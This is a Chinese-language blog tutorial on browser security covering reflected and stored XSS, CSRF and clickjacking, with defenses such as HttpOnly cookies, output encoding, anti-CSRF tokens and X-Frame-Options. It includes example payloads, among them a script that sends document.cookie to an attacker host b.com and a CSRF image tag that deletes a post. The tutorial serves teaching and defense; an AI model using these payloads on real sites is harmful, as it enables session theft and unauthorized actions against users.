---
layout: post
title: "Web安全技术(4)-浏览器安全"
date: 2015-04-25 22:32
categories: ["Web", "安全"]
---

一、跨站脚本攻击（XSS）
-----------------------

跨站脚本攻击的英文全称是Cross Site Script，为了和样式表区分，缩写为XSS。跨站脚本攻击仅发生在动态网站，静态站点完全不受其影响。这是因为动态网站会将用户输入的内容输出到页面上，在这个过程中可能有恶意代码被浏览器执行，造成用户损失。

跨站脚本攻击可以分为两种：

1. 反射型XSS

它是通过诱使用户打开一个恶意链接，服务端将链接中参数的恶意代码渲染到页面中，再传递给用户由浏览器执行，从而达到攻击的目的。如下面的链接：

    http://a.com/a.jsp?name=xss<script>alert(1)</script>

a.jsp将页面渲染成下面的html：

    Hello xss<script>alert(1)</script>

这时浏览器端会弹出提示框。

2. 持久型XSS

持久型XSS将恶意代码提交给服务器，并且存储在服务器端，当用户访问相关内容时再渲染到页面中，以达到攻击的目的，它的危害更大。

比如，攻击者写了一篇带恶意JS代码的博客，文章发表后，所有访问该博客文章的用户都会执行这段恶意JS。

### Cookie劫持 ###

Cookie中一般保存了当前用户的登录凭证，如果可以得到，往往意味着可直接进入用户帐户，而Cookie劫持也是最常的XSS攻击。以上面提过的反射型XSS的例子来说，可以像下面这样操作：

首先诱使用户打开下面的链接：

    http://a.com/a.jsp?name=xss<script src=http://b.com/b.js></script>

用户打开链接后，会加载b.js，并执行b.js中的代码。b.js中存储了以下JS代码：

    var img = document.createElement("img");
    img.src = "http://b.com/log?" + escape(document.cookie);
    document.body.appendChild(img);

上面的代码会向b.com请求一张图片，但实际上是将当前页面的cookie发到了b.com的服务器上。这样就完成了窃取cookie的过程。

__防御Cookie劫持的一个简单的方法是在Set-Cookie时加上HttpOnly标识，浏览器禁止JavaScript访问带HttpOnly属性的Cookie。__

### XSS的防御 ###

1. 输入检查

对输入数据做检查，比如用户名只允许是字母和数字，邮箱必须是指定格式。一定要在后台做检查，否则数据可能绕过前端检查直接发给服务器。一般前后端都做检查，这样前端可以挡掉大部分无效数据。

对特殊字符做编码或过滤，但因为不知道输出时的语境，所以可能会做不适当的过滤，最好是在输出时具体情况具体处理。

2. 输出检查

对渲染到HTML中内容执行HtmlEncode，对渲染到JavaScript中的内容执行JavascriptEncode。

另外还可以使用一些做XSS检查的开源项目。

二、跨站请求伪造（CSRF）
-----------------------

跨站请求伪造的英文全称是Cross Site Request Forgery，是由于操作所需的所有参数都能被攻击者得到，进而构造出一个伪造的请求，在用户不知情的情况下被执行。看下面一个例子：

如果a.com网站需要用户登录后可以删除博客，删除博客的请求地址如下：

    GET http://a.com/blog/delete?id=1

当用户登录a.com后，又打开了http://b.com/b.html，其中有下面的内容：

    <img src="http://a.com/blog/delete?id=1"/>

这时会以用户在a.com的身份发送http://a.com/blog/delete?id=1，删除那篇博客。

### CSRF的防御 ###

1. 验证码

CSRF是在用户不知情产情况下构造的网络情况，验证码则强制用户与应用交互，所以验证码可以很好得防止CSRF。但不能什么请求都加验证码。

2. referer检查

检查请求header中的referer也能帮助防止CSRF攻击，但服务器不是总能拿到referer，浏览器可能出于安全或隐私而不发送referer，所以也不常用。倒是图片防盗链中用得很多。

3. Anti CSRF Token

更多的是生成一个随机的token，在用户提交数据的同时提交这个token，服务器端比对后如果不正确，则拒绝执行操作。

三、点击劫持（ClickJacking）
-----------------------

点击劫持是从视觉上欺骗用户。攻击者使用一个透明的iframe覆盖在一个网页上，诱使用户在该网页上操作，而实际点击却是点在透明的iframe页面。

点击劫持延伸出了很多攻击方式，有图片覆盖攻击、拖拽劫持等。

### 点击劫持的防御 ###

使用一个HTTP头：X-Frame-Options，它有三种可选值：

- DENY： 禁止任何页面的frame加载；
- SAMEORIGIN：只有同源页面的frame可加载；
- ALLOW-FROM：可定义允许frame加载的页面地址。

